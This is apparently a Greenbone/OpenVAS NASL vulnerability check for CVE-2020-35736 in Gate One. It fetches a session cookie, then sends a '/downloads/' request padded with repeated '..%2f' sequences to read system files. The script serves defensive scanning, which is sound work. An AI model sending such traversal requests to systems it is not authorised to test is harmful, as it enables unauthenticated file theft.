# SPDX-FileCopyrightText: 2021 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:liftoffsoftware:gateone";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.146035");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2021-05-28 07:02:46 +0000 (Fri, 28 May 2021)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2020-12-29 20:50:00 +0000 (Tue, 29 Dec 2020)");

  script_cve_id("CVE-2020-35736");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("Gate One Directory Traversal Vulnerability (Dec 2020)");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2021 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_gate_one_http_detect.nasl");
  script_mandatory_keys("liftoffsoftware/gateone/http/detected");
  script_require_ports("Services/www", 443);

  script_tag(name:"summary", value:"Gate One is prone to a directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Gate One allows arbitrary file download without authentication
  via /downloads/.. directory traversal because os.path.join is misused.");

  script_tag(name:"affected", value:"Gate One 1.2 and prior.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since
  the disclosure of this vulnerability. Likely none will be provided anymore. General solution options
  are to upgrade to a newer release, disable respective features, remove the product or replace the
  product by another one.");

  script_xref(name:"URL", value:"https://github.com/liftoff/GateOne/issues/747");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

files = traversal_files("linux");

# nb: Don't use http_get_cache() as we need a current cookie
req = http_get(port: port, item: "/auth?next=%2F");
res = http_keepalive_send_recv(port: port, data: req);

if ("gateone_user" >!< res)
  exit(0);

cookie = http_get_cookie_from_header(buf: res, pattern: "(gateone_user=[^;]+)");
if (isnull(cookie))
  exit(0);

foreach pattern (keys(files)) {
  url = "/downloads/" + crap(length: 5 * 9, data: "..%2f") + files[pattern];

  if (http_vuln_check(port: port, url: url, pattern: pattern, cookie: cookie, check_header: TRUE)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
